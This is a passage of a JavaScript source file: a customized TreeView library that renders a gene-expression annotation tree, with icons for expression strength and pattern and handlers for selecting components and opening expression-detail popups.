//****************************************************************
// Keep this copyright notice:
// This copy of the script is the property of the owner of the
// particular web site you were visiting.
// Do not download the script's files from there.
// For a free download and full instructions go to:
// http://www.treeview.net
//****************************************************************


// Log of changes:
//
//      08 Jun 04 - Very small change to one error message
//      21 Mar 04 - Support for folder.addChildren allows for much bigger trees
//      12 May 03 - Support for Safari Beta 3
//      01 Mar 03 - VERSION 4.3 - Support for checkboxes
//      21 Feb 03 - Added support for Opera 7
//      22 Sep 02 - Added maySelect member for node-by-node control
//                  of selection and highlight
//      21 Sep 02 - Cookie values are now separated by cookieCutter
//      12 Sep 02 - VERSION 4.2 - Can highlight Selected Nodes and
//                  can preserve state through external (DB) IDs
//      29 Aug 02 - Fine tune 'supportDeferral' for IE4 and IE Mac
//      25 Aug 02 - Fixes: STARTALLOPEN, and multi-page frameless
//      09 Aug 02 - Fix repeated folder on Mozilla 1.x
//      31 Jul 02 - VERSION 4.1 - Dramatic speed increase for trees
//      with hundreds or thousands of nodes; changes to the control
//      flags of the gLnk function
//      18 Jul 02 - Changes in pre-load images function
//      13 Jun 02 - Add ICONPATH var to allow for gif subdir
//      20 Apr 02 - Improve support for frame-less layout
//      07 Apr 02 - Minor changes to support server-side dynamic feeding
//                  (example: FavoritesManagerASP)


/**
 * Definition of class Folder
 * @param folderDescription - description of the component e.g. name
 * @param hreference - function to be executed when component is clicked
 * @param group - is the component a group term or a group descendent
 * @param expression - type of expression on the component or not examined
 * @param strength - strength of expression
 * @param pattern - pattern of expresssion
 * @param note - if there is a note associated with the component
 */
function Folder(folderDescription, hreference, group, expression, strength, pattern, note) //constructor
{
  //constant data
  this.desc = folderDescription;
  this.hreference = hreference;
  this.isGroup = group
  this.id = -1;
  this.isAnnotDetected;
  this.isAnnotNotPresent;
  this.isAnnotPossible;
  this.iconSrc;
  this.iconSrcClosed;
  this.patternIcons = new Array();
  this.noteIcon;
  
  /* need to determine what icon is displayed in the html depending on what type of expression
   * and set the expression instance variables to 1 or 0 accordingly
  */
  if(expression.indexOf("present")>=0) {
    this.isAnnotDetected = 1;
    this.isAnnotNotPresent = 0;
    this.isAnnotPossible = 0;
    if(strength.indexOf("strong") >= 0) {
      this.iconSrc = ICONPATH + "StrongRoundPlus20x20.gif";
      this.iconSrcClosed = ICONPATH + "StrongRoundPlus20x20.gif";
    }
    else if (strength.indexOf("moderate") >=0){
        this.iconSrc = ICONPATH + "ModerateRoundPlus20x20.gif";
        this.iconSrcClosed = ICONPATH + "ModerateRoundPlus20x20.gif";
      }
      else if (strength.indexOf("weak") >= 0){
        this.iconSrc = ICONPATH + "WeakRoundPlus20x20.gif";
        this.iconSrcClosed = ICONPATH + "WeakRoundPlus20x20.gif";
      }
      else {
        this.iconSrc = ICONPATH + "DetectedRoundPlus20x20.gif";
        this.iconSrcClosed = ICONPATH + "DetectedRoundPlus20x20.gif";
      }
  }
  else if(expression.indexOf("not detected") >=0) {
    this.isAnnotDetected = 0;
    this.isAnnotNotPresent = 1;
    this.isAnnotPossible = 0;
    this.iconSrc = ICONPATH + "NotDetectedRoundMinus20x20.gif";
    this.iconSrcClosed = ICONPATH + "NotDetectedRoundMinus20x20.gif";
  }
  else if((expression.indexOf("possible") >=0)||(expression.indexOf("uncertain") >=0)) {
    this.isAnnotDetected = 0;
    this.isAnnotNotPresent = 0;
    this.isAnnotPossible = 1;   
    this.iconSrc = ICONPATH + "PossibleRound20x20.gif";
    this.iconSrcClosed = ICONPATH + "PossibleRound20x20.gif";
  }
  else {
    this.isAnnotDetected = 0;
    this.isAnnotNotPresent = 0;
    this.isAnnotPossible = 0;
    this.iconSrc = ICONPATH + "Frame20x20.gif";
    this.iconSrcClosed = ICONPATH + "Frame20x20.gif";
  }
  
  //patterns are comma separated - split them into individual components
  patterns = pattern.split(",");
  
  /*
   * for each pattern, select the icon to be rendered in the page
   */
  for(a=0;a<patterns.length;a++){
    if(patterns[a].indexOf("homogeneous") >=0) {
      this.patternIcons[a] = ICONPATH + "HomogeneousRound20x20.png";
    }
    else if(patterns[a].indexOf("spotted") >=0) {
      this.patternIcons[a] = ICONPATH + "SpottedRound20x20.png";
    }
    else if(patterns[a].indexOf("regional") >=0) {
      this.patternIcons[a] = ICONPATH + "RegionalRound20x20.png";
    }
    else if(patterns[a].indexOf("graded") >=0) {
      this.patternIcons[a] = ICONPATH + "GradedRound20x20.png";
    }
    else if(patterns[a].indexOf("ubiquitous") >=0) {
      this.patternIcons[a] = ICONPATH + "UbiquitousRound20x20.png";
    }
    else if(patterns[a].indexOf("other") >=0) {
      this.patternIcons[a] = ICONPATH + "OtherRound20x20.png";
    }
    else if(patterns[a].indexOf("single cell") >=0) {
    	this.patternIcons[a] = ICONPATH + "SingleCellRound20x20.png";
    }
    else if(patterns[a].indexOf("restricted") >=0) {
    	this.patternIcons[a] = ICONPATH + "RestrictedRound20x20.png";
    }
  }
  
  //if a note exists, add a note icon to be rendered on the page
  if(note) {
    this.noteIcon = ICONPATH + "note.gif";
  }
  
  //this code will determine if there is inferred expression on a component but has been disabled
  this.hasIndirAnnoDet = false;
  this.hasIndirAnnoNotPres = false;
  this.hasIndirAnnoPossible = false;
  this.navObj = 0;
  this.iconImg = 0;
  this.nodeImg = 0;
  this.isLastNode = 0;
  
  this.children = new Array;
  this.nChildren = 0;
  this.level = 0;
  this.leftSideCoded = "";
  this.isLastNode=false;
  this.parentObj = null;
  this.maySelect=true;
  this.prependHTML = ""

  //dynamic data
  this.isOpen = false
  this.isLastOpenedFolder = false
  this.isRendered = 0

  //methods
  this.initialize = initializeFolder
  this.setState = setStateFolder
  this.addChild = addChild
  this.addChildren = addChildren
  this.createIndex = createEntryIndex
  this.escondeBlock = escondeBlock
  this.esconde = escondeFolder
  this.folderMstr = folderMstr
  this.renderOb = drawFolder
  this.totalHeight = totalHeight
  this.subEntries = folderSubEntries
  this.linkHTML = linkFolderHTML
  this.blockStartHTML = blockStartHTML
  this.blockEndHTML = blockEndHTML
  this.nodeImageSrc = nodeImageSrc
  this.iconImageSrc = iconImageSrc
  this.getID = getID
  this.forceOpeningOfAncestorFolders = forceOpeningOfAncestorFolders
  this.createAnnoList = createListOfAnnotatedEntries
  this.setIdOfVisceralNodes = setIdOfVisceralNodes
}

function initializeFolder(level, lastNode, leftSide)
{
  var j=0
  var i=0
  nc = this.nChildren
  this.createIndex()
  if(ANNOTATEDTREE)
    this.createAnnoList()
  this.level = level
  this.leftSideCoded = leftSide

  if(OPENATVISCERAL)
    if(this.desc.indexOf("visceral organ") >=0)
      this.setIdOfVisceralNodes();

  if (browserVersion == 0 || STARTALLOPEN==1)// || this.hasIndirAnnoDet)
    this.isOpen=true;

  if (level>0)
    if (lastNode) //the last child in the children array
		leftSide = leftSide + "0"
	else
		leftSide = leftSide + "1"
  this.isLastNode = lastNode
  if (nc > 0)
  {
    level = level + 1
    for (i=0 ; i < this.nChildren; i++)
    {
      if (typeof this.children[i].initialize == 'undefined') //document node was specified using the addChildren function
      {
        if (typeof this.children[i][0] == 'undefined' || typeof this.children[i] == 'string')
        {
          this.children[i] = ["item incorrectly defined", ""];
        }

        //Basic initialization of the Item object
        //These members or methods are needed even before the Item is rendered
        this.children[i].initialize=initializeItem;
        this.children[i].createIndex=createEntryIndex;
        if (typeof this.children[i].maySelect == 'undefined')
          this.children[i].maySelect=true
        this.children[i].forceOpeningOfAncestorFolders = forceOpeningOfAncestorFolders
      }
      if (i == this.nChildren-1)
        this.children[i].initialize(level, 1, leftSide)
      else
        this.children[i].initialize(level, 0, leftSide)
    }
  }
}

function drawFolder(insertAtObj)
{
  var nodeName = ""
  var auxEv = ""
  var docW = ""
  var i=0

  finalizeCreationOfChildDocs(this)
  var leftSide = leftSideHTML(this.leftSideCoded)

  if (browserVersion > 0)
    auxEv = "<a href='javascript:clickOnNode(\""+this.getID()+"\")'>"
  else
    auxEv = "<a>"

  nodeName = this.nodeImageSrc()

  if (this.level>0)
    if (this.isLastNode) //the last child in the children array
	    leftSide = leftSide + "<td valign=top>" + auxEv + "<img name='nodeIcon" + this.id + "' id='nodeIcon" + this.id + "' src='" + nodeName + "' width=16 height=22 border=0></a></td>"
    else
      leftSide = leftSide + "<td valign=top background=" + ICONPATH + "ftv2vertline.gif>" + auxEv + "<img name='nodeIcon" + this.id + "' id='nodeIcon" + this.id + "' src='" + nodeName + "' width=16 height=22 border=0></a></td>"

  this.isRendered = 1

  if (browserVersion == 2) {
    if (!doc.yPos)
      doc.yPos=20
  }

  docW = this.blockStartHTML("folder");

  docW = docW + "<tr>" + leftSide + "<td valign=top>";
  if (USEICONS)
  {
    docW = docW + this.linkHTML(false)
    docW = docW + "<img id='folderIcon" + this.id + "' name='folderIcon" + this.id + "' src='" + this.iconImageSrc() + "' border=0></a>"
  }
  else
  {
	  if (this.prependHTML == "")
        docW = docW + "<img src=" + ICONPATH + "ftv2blank.gif height=2 width=2>"
  }
  if (WRAPTEXT)
	  docW = docW + "</td>"+this.prependHTML+"<td valign=middle id='itemText"+this.id+"' width=100%>"
  else
	  docW = docW + "</td>"+this.prependHTML+"<td class='plaintext' valign=middle id='itemText"+this.id+"' nowrap width=100%>"

  gp = "";
  if(this.isGroup)
    gp = "<strong><em>G</em></strong> ";
  if (USETEXTLINKS)
  {
    docW = docW + this.linkHTML(true)
    docW = docW + gp + this.desc + "</a>"

  }
  else {
    modDesc = this.desc
    
    docW = docW + gp + modDesc;
  }
  
  if(this.patternIcons[0] != null){
  
    for(b=0;b<this.patternIcons.length;b++){
      docW = docW + "&nbsp;<img id='patternIcon" + b + this.id + "' name='patternIcon" + b + this.id + "' src='" + this.patternIcons[b] + "' border=0>"
    }
  }
    
  if(this.noteIcon != null) {
    docW = docW + "&nbsp;<img id='noteIcon" + this.id + "' name='noteIcon" + this.id + "' src='" + this.noteIcon + "' border=0>"
  }
  
  docW = docW + "</td>"

  docW = docW + this.blockEndHTML()

  if (insertAtObj == null)
  {
	  if (supportsDeferral) {
		  doc.write("<div id=domRoot></div>") //transition between regular flow HTML, and node-insert DOM DHTML
		  insertAtObj = getElById("domRoot")
		  insertAtObj.insertAdjacentHTML("beforeEnd", docW)
	  }
	  else
		  doc.write(docW)
  }
  else
  {
      insertAtObj.insertAdjacentHTML("afterEnd", docW)
  }

  if (browserVersion == 2)
  {
    this.navObj = doc.layers["folder"+this.id]
    if (USEICONS)
      this.iconImg = this.navObj.document.images["folderIcon"+this.id]
    this.nodeImg = this.navObj.document.images["nodeIcon"+this.id]
    doc.yPos=doc.yPos+this.navObj.clip.height
  }
  else if (browserVersion != 0)
  {
    this.navObj = getElById("folder"+this.id)
    if (USEICONS)
      this.iconImg = getElById("folderIcon"+this.id)
    this.nodeImg = getElById("nodeIcon"+this.id)
  }
}

function setStateFolder(isOpen)
{
  var subEntries
  var totalHeight
  var fIt = 0
  var i=0
  var currentOpen

  if (isOpen == this.isOpen) {
    return
  }
  if (browserVersion == 2)
  {
    totalHeight = 0
    for (i=0; i < this.nChildren; i++)
      totalHeight = totalHeight + this.children[i].navObj.clip.height
      subEntries = this.subEntries()
    if (this.isOpen)
      totalHeight = 0 - totalHeight
    for (fIt = this.id + subEntries + 1; fIt < nEntries; fIt++)
      indexOfEntries[fIt].navObj.moveBy(0, totalHeight)
  }
  this.isOpen = isOpen;

  if (this.getID()!=foldersTree.getID() && PRESERVESTATE && !this.isOpen) //closing
  {
     currentOpen = GetCookie("clickedFolder")
     if (currentOpen != null) {
         currentOpen = currentOpen.replace(this.getID()+cookieCutter, "")
         SetCookie("clickedFolder", currentOpen)
     }
  }

  if (!this.isOpen && this.isLastOpenedfolder)
  {
		lastOpenedFolder = null;
		this.isLastOpenedfolder = false;
  }
  propagateChangesInState(this)
}

function propagateChangesInState(folder)
{
  var i=0

  //Change icon
  if (folder.nChildren > 0 && folder.level>0)  //otherwise the one given at render stays
    folder.nodeImg.src = folder.nodeImageSrc()

  //Change node
  if (USEICONS)
    folder.iconImg.src = folder.iconImageSrc()

  //Propagate changes
  for (i=folder.nChildren-1; i>=0; i--) {
    if (folder.isOpen)
      folder.children[i].folderMstr(folder.navObj)
    else
  	  folder.children[i].esconde()
  }
}

function escondeFolder()
{
  this.escondeBlock()

  this.setState(0)
}

function linkFolderHTML(isTextLink)
{
  var docW = "";

  if (this.hreference)
  {
	if (USEFRAMES)
	  docW = docW + "<a class=\"plaintext\" href=\"" + this.hreference + "\" TARGET=\"basefrm\" "
	else
	  docW = docW + "<a class=\"plaintext\" href=\"" + this.hreference + "\" TARGET=_top "

    if (isTextLink) {
        docW += "id=\"itemTextLink"+this.id+"\" ";
    }

    if (browserVersion > 0)
      docW = docW + "onClick='javascript:clickOnFolder(\""+this.getID()+"\")'"

    docW = docW + ">"
  }
  else
    docW = docW + "<a>"

  return docW;
}
/**
 * function to apply inferred present annotation to all the ancestors 
 * of a component if the component has been annotated as expression 'uncertain' or 'possible' 
 */
function checkPossibleAnnotation(childFolder) {

  parNode = childFolder.parentObj;

  if(childFolder.isAnnotPossible) {
    parNode.hasIndirAnnoPossible = 1

    while(parNode.parentObj != null) {
      parNode = parNode.parentObj;
      parNode.hasIndirAnnoPossible = 1;
    }
  }
}
/**
 * function to apply inferred present annotation to all the ancestors 
 * of a component if the component has been annotated as expression present 
 */
function checkDetectedAnnotation(childFolder) {
  parNode = childFolder.parentObj

  if(childFolder.isAnnotDetected) {
    parNode.hasIndirAnnoDet = 1

    while(parNode.parentObj != null) {
      parNode = parNode.parentObj;
      parNode.hasIndirAnnoDet = 1;
    }
  }
}
/**
 * add a childNode object to an array which is an instance variable of the parent object
 * @param childNode - the child object being added to the parent's array
 */
function addChild(childNode)
{
  this.children[this.nChildren] = childNode
  childNode.parentObj = this

  //check if gene expression on the node is annotated as 'not present'
  if(this.isAnnotNotPresent || this.hasIndirAnnoNotPres) {
    childNode.hasIndirAnnoNotPres = true;
  }
  this.nChildren++
  return childNode
}

//The list can contain either a Folder object or a sub list with the arguments for Item
function addChildren(listOfChildren)
{
  this.children = listOfChildren
  this.nChildren = listOfChildren.length
  for (i=0; i<this.nChildren; i++)
    this.children[i].parentObj = this
}

function indirectAnnotationOfParents(nodeObject) {
  currNodeObject = nodeObject;
  curNodeObject.hasIndirAnnoDet = true;
  while (currNodeObject.parentObj != null) {
    currNodeObject = currNodeobject.parentObj;
    currNodeObject.hasIndirAnnoDet = true;
  }
}

function folderSubEntries()
{
  var i = 0
  var se = this.nChildren

  for (i=0; i < this.nChildren; i++){
    if (this.children[i].children) //is a folder
      se = se + this.children[i].subEntries()
  }

  return se
}

function nodeImageSrc() {
  var srcStr = "";

  if (this.isLastNode) //the last child in the children array
  {
    if (this.nChildren == 0)
      srcStr = ICONPATH + "ftv2lastnode.gif"
    else
      if (this.isOpen)
        srcStr = ICONPATH + "ftv2mlastnode.gif"
      else
        srcStr = ICONPATH + "ftv2plastnode.gif"
  }
  else
  {
    if (this.nChildren == 0)
      srcStr = ICONPATH + "ftv2node.gif"
    else
      if (this.isOpen)
        srcStr = ICONPATH + "ftv2mnode.gif"
      else
        srcStr = ICONPATH + "ftv2pnode.gif"
  }
  return srcStr;
}

function iconImageSrc() {
  if (this.isOpen)
    return(this.iconSrc)
  else
    return(this.iconSrcClosed)
}

/**
 * Definition of class Item (a document or link inside a Folder)
 * @param itemDescription - description of the component e.g. name
 * @param group - is the component a group term or a group descendent
 * @param expression - type of expression on the component or not examined
 * @param strength - strength of expression
 * @param pattern - pattern of expresssion
 * @param note - if there is a note associated with the component
 */
function Item(itemDescription, group, expression, strength, pattern, note) // Constructor
{
  // constant data
  this.desc = itemDescription
  this.isGroup = group
  
  this.isAnnotDetected;
  this.isAnnotNotPresent;
  this.isAnnotPossible;
  this.iconSrc;
  this.patternIcons = new Array();
  this.noteIcon;
  
  /* need to determine what icon is displayed in the html depending on what type of expression
   * and set the expression instance variables to 1 or 0 accordingly
  */
  if(expression.indexOf("present") >=0) {
    this.isAnnotDetected = 1;
    this.isAnnotNotPresent = 0;
    this.isAnnotPossible = 0;
    
    if(strength.indexOf("strong") >=0){
      this.iconSrc = ICONPATH + "StrongRoundPlus20x20.gif";
    }
    else if (strength.indexOf("moderate") >=0){
      this.iconSrc = ICONPATH + "ModerateRoundPlus20x20.gif";
    }
    else if (strength.indexOf("weak") >=0){
      this.iconSrc = ICONPATH + "WeakRoundPlus20x20.gif";
    }
    else {
      this.iconSrc = ICONPATH + "DetectedRoundPlus20x20.gif";
    }
  }
  else if(expression.indexOf("not detected") >=0) {
    this.isAnnotDetected = 0;
    this.isAnnotNotPresent = 1;
    this.isAnnotPossible = 0;
    
    this.iconSrc = ICONPATH + "NotDetectedRoundMinus20x20.gif";
  }
  else if((expression.indexOf("possible") >=0)||(expression.indexOf("uncertain") >=0)) {
    this.isAnnotDetected = 0;
    this.isAnnotNotPresent = 0;
    this.isAnnotPossible = 1;
    
    this.iconSrc = ICONPATH + "PossibleRound20x20.gif";
    
  }
  else {
    this.isAnnotDetected = 0;
    this.isAnnotNotPresent = 0;
    this.isAnnotPossible = 0;

    this.iconSrc = ICONPATH + "Frame20x20.gif";    
  }
  
  //patterns are comma separated - split them into individual components
  patterns = pattern.split(",");
  
  for(a=0;a<patterns.length;a++){
    if(patterns[a].indexOf("homogeneous") >=0) {
      this.patternIcons[a] = ICONPATH + "HomogeneousRound20x20.png";
    }
    else if(patterns[a].indexOf("spotted") >=0) {
      this.patternIcons[a] = ICONPATH + "SpottedRound20x20.png";
    }
    else if(patterns[a].indexOf("regional") >=0) {
      this.patternIcons[a] = ICONPATH + "RegionalRound20x20.png";
    }
    else if(patterns[a].indexOf("graded") >=0) {
      this.patternIcons[a] = ICONPATH + "GradedRound20x20.png";
    }
    else if(patterns[a].indexOf("ubiquitous") >=0) {
      this.patternIcons[a] = ICONPATH + "UbiquitousRound20x20.png";
    }
    else if(patterns[a].indexOf("other") >=0) {
      this.patternIcons[a] = ICONPATH + "OtherRound20x20.png";
    }
    else if(patterns[a].indexOf("single cell") >=0) {
    	this.patternIcons[a] = ICONPATH + "SingleCellRound20x20.png";
    }
    else if(patterns[a].indexOf("restricted") >=0) {
    	this.patternIcons[a] = ICONPATH + "RestrictedRound20x20.png";
    }
  }
  
  if(note) {
    this.noteIcon = ICONPATH + "note.gif";
  }
  
  this.hasIndirAnnoDet = false;
  this.hasIndirAnnoNotPres = false;
  this.hasIndirAnnoPossible = false;

  this.level = 0
  this.isLastNode = false
  this.leftSideCoded = ""
  this.parentObj = null

  this.maySelect=true

  this.initialize = initializeItem;
  this.createIndex = createEntryIndex;
  this.forceOpeningOfAncestorFolders = forceOpeningOfAncestorFolders;
  this.createAnnoList = createListOfAnnotatedEntries
  this.setIdOfVisceralNodes = setIdOfVisceralNodes

  finalizeCreationOfItem(this)
}

//Assignments that can be delayed when the item is created with folder.addChildren
//The assignments that cannot be delayed are done in addChildren and in initializeFolder
//Additionaly, some assignments are also done in finalizeCreationOfChildDocs itself
function finalizeCreationOfItem(itemArray)
{
  itemArray.navObj = 0 //initialized in render()
  itemArray.iconImg = 0 //initialized in render()
  //itemArray.iconSrc = ICONPATH + "ftv2doc.gif"
  itemArray.isRendered = 0
  itemArray.nChildren = 0
  itemArray.prependHTML = ""

  // methods
  itemArray.escondeBlock = escondeBlock
  itemArray.esconde = escondeBlock
  itemArray.folderMstr = folderMstr
  itemArray.renderOb = drawItem
  itemArray.totalHeight = totalHeight
  itemArray.blockStartHTML = blockStartHTML
  itemArray.blockEndHTML = blockEndHTML
  itemArray.getID = getID
}

function initializeItem(level, lastNode, leftSide)
{
  this.createIndex()
  if(ANNOTATEDTREE)
    this.createAnnoList()
  this.level = level
  this.leftSideCoded = leftSide
  this.isLastNode = lastNode
  if(OPENATVISCERAL)
    if(this.desc.indexOf("visceral organ") >=0)
      this.setIdOfVisceralNodes();
}

function drawItem(insertAtObj)
{
  var leftSide = leftSideHTML(this.leftSideCoded)
  var docW = ""

  var fullLink = "href=\""+this.link+"\" TARGET=_top onClick='javascript:clickOnLink(\""+this.getID()+"\")'";
  this.isRendered = 1

  if (this.level>0)
    if (this.isLastNode) //the last 'brother' in the children array
    {
      leftSide = leftSide + "<td valign=top><img src='" + ICONPATH + "ftv2lastnode.gif' width=16 height=22></td>"
    }
    else
    {
      leftSide = leftSide + "<td valign=top background=" + ICONPATH + "ftv2vertline.gif><img src='" + ICONPATH + "ftv2node.gif' width=16 height=22></td>"
    }

  docW = docW + this.blockStartHTML("item")

  docW = docW + "<tr>" + leftSide + "<td valign=top>"
  if (USEICONS)
      docW = docW + "<a class='plaintext' " + fullLink  + " id=\"itemIconLink"+this.id+"\">" + "<img id='itemIcon"+this.id+"' " + "src='"+this.iconSrc+"' border=0>" + "</a>"
  else
	  if (this.prependHTML == "")
        docW = docW + "<img src=" + ICONPATH + "ftv2blank.gif height=2 width=3>"

  if (WRAPTEXT)
    docW = docW + "</td>"+this.prependHTML+"<td valign=middle id='text"+this.id+"' width=100%>"
  else
    docW = docW + "</td>"+this.prependHTML+"<td class='plaintext' valign=middle id='text"+this.id+"' nowrap width=100%>"

  gp = "";
  if(this.isGroup) {
    gp = "<strong><em>G</em></strong> ";
  }

  if (USETEXTLINKS) {
    docW = docW + "<a class='plaintext' " + fullLink + " id=\"itemTextLink"+this.id+"\">" + gp + this.desc + "</a>"
  }
  else {
    modDesc = this.desc
    
    docW = docW + gp + modDesc;
  }
  
  if(this.patternIcons[0] != null){
    
    for(b=0;b<this.patternIcons.length;b++){
      docW = docW + "&nbsp;<img id='patternIcon" + b + this.id + "' name='patternIcon" + b + this.id + "' src='" + this.patternIcons[b] + "' border=0>"
    }
  }
    
  if(this.noteIcon != null) { 
    docW = docW + "&nbsp;<img id='noteIcon" + this.id + "' name='noteIcon" + this.id + "' src='" + this.noteIcon + "' border=0>";
  }

  docW = docW + "</td>"
  docW = docW + this.blockEndHTML()

  if (insertAtObj == null)
  {
	  doc.write(docW)
  }
  else
  {
      insertAtObj.insertAdjacentHTML("afterEnd", docW)
  }

  if (browserVersion == 2) {
    this.navObj = doc.layers["item"+this.id]
    if (USEICONS)
      this.iconImg = this.navObj.document.images["itemIcon"+this.id]
    doc.yPos=doc.yPos+this.navObj.clip.height
  } else if (browserVersion != 0) {
    this.navObj = getElById("item"+this.id)
    if (USEICONS)
      this.iconImg = getElById("itemIcon"+this.id)
  }
  //alert(docW);
}


// Methods common to both objects (pseudo-inheritance)
// ********************************************************

	function forceOpeningOfAncestorFolders() {
	  var node = this.parentObj;
	  if (node.isOpen || node == null)
	    return
	  else {
	    node.forceOpeningOfAncestorFolders()
	    node.setState(true) //open
	  }
	}

/* Replace with the above to speed it up specially in IE -- Mehran (2/10/09) 
function forceOpeningOfAncestorFolders() {
  if (this.parentObj == null || this.parentObj.isOpen)
    return
  else {
    this.parentObj.forceOpeningOfAncestorFolders()
    clickOnNodeObj(this.parentObj)
  }
}
*/

function escondeBlock()
{
  if (browserVersion == 1 || browserVersion == 3) {
    if (this.navObj.style.display == "none")
      return
    this.navObj.style.display = "none"
  } else {
    if (this.navObj.visibility == "hidden")
      return
    this.navObj.visibility = "hidden"
  }
}

function folderMstr(domObj)
{
  if (browserVersion == 1 || browserVersion == 3) {
    if (t==-1)
      return
    var str = new String(doc.links[t])
    if (str.slice(14,16) != "em") {
      return
    }
  }

  if (!this.isRendered) {
    this.renderOb(domObj)
  }
  else
    if (browserVersion == 1 || browserVersion == 3)
      this.navObj.style.display = "block"
    else
      this.navObj.visibility = "show"
}

function blockStartHTML(idprefix) {

  var idParam = "id='" + idprefix + this.id + "'"
  var docW = ""

  if (browserVersion == 2)
    docW = "<layer "+ idParam + " top=" + doc.yPos + " visibility=show>"
  else if (browserVersion != 0)
    docW = "<div " + idParam + " style='display:block; position:block;'>"

  docW = docW + "<table border=0 cellspacing=0 cellpadding=0 width=100% >"
  return docW
}

function blockEndHTML() {
  var docW = ""

  docW = "</table>"

  if (browserVersion == 2)
    docW = docW + "</layer>"
  else if (browserVersion != 0)
    docW = docW + "</div>"

  return docW
}

function createEntryIndex()
{
  this.id = nEntries
  indexOfEntries[nEntries] = this
  nEntries++
}

function createListOfAnnotatedEntries() {
  if(this.isAnnotDetected) {
    idsWithAnnotPres[nAnnoPresEntries] = this.id
    nAnnoPresEntries++
  }
  if(this.isAnnotNotPresent) {
    idsWithAnnotNotDet[nAnnoNoDetEntries] = this.id
    nAnnoNoDetEntries++
  }
  if(this.isAnnotPossible) {
    idsWithAnnoPossible[nAnnoPossibleEntries] = this.id
    nAnnoPossibleEntries++
  }

}

function setIdOfVisceralNodes() {
  visceralNodes[numVisceralNodes] = this.id
  numVisceralNodes++
}

// total height of subEntries open
function totalHeight() //used with browserVersion == 2
{
  var h = this.navObj.clip.height
  var i = 0

  if (this.isOpen) //is a folder and _is_ open
    for (i=0 ; i < this.nChildren; i++)
      h = h + this.children[i].totalHeight()

  return h
}


function leftSideHTML(leftSideCoded) {
	var i;
	var retStr = "";

	for (i=0; i<leftSideCoded.length; i++)
	{
		if (leftSideCoded.charAt(i) == "1")
		{
			retStr = retStr + "<td valign=top background=" + ICONPATH + "ftv2vertline.gif><img src='" + ICONPATH + "ftv2vertline.gif' width=16 height=22></td>"
		}
		if (leftSideCoded.charAt(i) == "0")
		{
			retStr = retStr + "<td valign=top><img src='" + ICONPATH + "ftv2blank.gif' width=16 height=22></td>"
		}
	}
	return retStr
}

function getID()
{
  //define a .xID in all nodes (folders and items) if you want to PERVESTATE that
  //work when the tree changes. The value eXternal value must be unique for each
  //node and must node change when other nodes are added or removed
  //The value may be numeric or string, but cannot have the same char used in cookieCutter
  if (typeof this.xID != "undefined")
    return this.xID
  else
    return this.id
}


// Events
// *********************************************************

function clickOnFolder(folderId)
{
  var clicked = findObj(folderId)

  if (typeof clicked=='undefined' || clicked==null)
  {
    alert("Treeview was not able to find the node object corresponding to ID=" + folderId + ". If the configuration file sets a.xID values, it must set them for ALL nodes, including the foldersTree root.")
    return;
  }

  if (!clicked.isOpen) {
    //clickOnNodeObj(clicked)
  }

  if (lastOpenedFolder != null && lastOpenedFolder != folderId)
    clickOnNode(lastOpenedFolder); //sets lastOpenedFolder to null

  if (clicked.nChildren==0) {
    lastOpenedFolder = folderId;
    clicked.isLastOpenedfolder = true
  }

  if (isLinked(clicked.hreference)) {
      highlightObjLink(clicked);
  }
}

function clickOnNode(folderId)
{
  fOb = findObj(folderId);
  if (typeof fOb=='undefined' || fOb==null)
  {
    alert("Treeview was not able to find the node object corresponding to ID=" + folderId + ". If the configuration file sets a.xID, it must set foldersTree.xID as well.")
    return;
  }

  clickOnNodeObj(fOb);
}

function clickOnNodeObj(folderObj)
{
  var state = 0
  var currentOpen

  state = folderObj.isOpen
  folderObj.setState(!state) //open<->close

  if (folderObj.id!=foldersTree.id && PRESERVESTATE)
  {
    currentOpen = GetCookie("clickedFolder")
    if (currentOpen == null)
      currentOpen = ""

    if (!folderObj.isOpen) //closing
    {
      currentOpen = currentOpen.replace(folderObj.getID()+cookieCutter, "")
      SetCookie("clickedFolder", currentOpen)
    }
    else
      SetCookie("clickedFolder", currentOpen+folderObj.getID()+cookieCutter)
  }

}

function clickOnLink(clickedId) {
    highlightObjLink(findObj(clickedId));
    //if (isLinked(target)) {
    //    window.open(target,windowName);
    //}

}

function showComponentIDII(id_to_display, text_to_display, row) {
    if(document.getElementById('components').innerHTML.indexOf(row) >= 0)
    {
      var displayed_text = "";
      var component = document.getElementById('components').innerHTML
      var componentList = new Array();
      //if  ie or safari, split the string on uppercase '<BR>'
      if(browserVersion == 1) {
        componentList = component.split("<BR>");
      }
      else {
        componentList = component.split("<br>");
      }

      for (i=0; i < componentList.length -1; i++) {

        var startpos;
        var endpos;
        if(browserVersion == 1) {
          startpos = componentList[i].indexOf("id=");
          startpos= startpos + 3;
          endpos = componentList[i].indexOf(">");
        }
        else {
          startpos = componentList[i].indexOf("id=\"");
          startpos= startpos + 4;
          endpos = componentList[i].indexOf("\">");
        }
        var spanid = componentList[i].substring(startpos,endpos);

        //idlength = row.length;
        //startpos = componentList[i].indexOf(row);
        //substringid = componentList[i].substr(startpos,idlength);
        alert(componentList[i]);

        //alert(idlength);
        //alert(startpos);
        alert(spanid);

        if(spanid != row) {
          displayed_text += componentList[i] + "<br>";
        }
      }

      var c1 = document.getElementById('components');
      c1.innerHTML = displayed_text;

    }
    else {
      var c1 = document.getElementById('components');
      c1.innerHTML += "<span class=\"plaintextbold\" id=\""+row+"\">"+text_to_display+ "</span><input type=\"hidden\" name=\"component\" value=\""+id_to_display+"\" /><br>";
    }
    if (document.getElementById('components').innerHTML != "") {
      var c2 = document.getElementById('submitbutton');
      c2.innerHTML = "<input type=\"submit\" value=\"Search\" name=\"search\" />";
    }
    else {
      var c2 = document.getElementById('submitbutton');
      c2.innerHTML = "";
    }
}

function showExprInfo(emapID, text_to_display, row) {
  var w = window.open('expression_detail.html?id='+SUBMISSION_ID+'&componentId='+emapID,'probePopup','resizable=1,toolbar=0,scrollbars=1,width=600,height=400');
  w.focus();
}

var numComps = 0;

function showComponentIDIII(id_to_display, text_to_display, row) {

    var components = document.getElementById('components');
    if(document.getElementById('comp'+row)) {
      singlecomp = document.getElementById('comp'+row);
      components.removeChild(singlecomp);
      numComps--;
    }
    else{
      components.innerHTML += '<div class="plaintextbold" id="comp'+row+'">'+text_to_display+'<input type="hidden" name="component" value="'+id_to_display+'" /></div>';
      numComps++;
    }


    if(numComps < 1) {
      var c2 = document.getElementById('submitbutton');
      c2.innerHTML = "";
    }
    else {
      var c2 = document.getElementById('submitbutton');
      c2.innerHTML = "<input type=\"submit\" value=\"Search\" name=\"search\" />";
    }
}

function hideAnnotationPopup(e){
	if(!e) {
        e = event;
    }
    var obj = (e.target) ? e.target : event.srcElement;
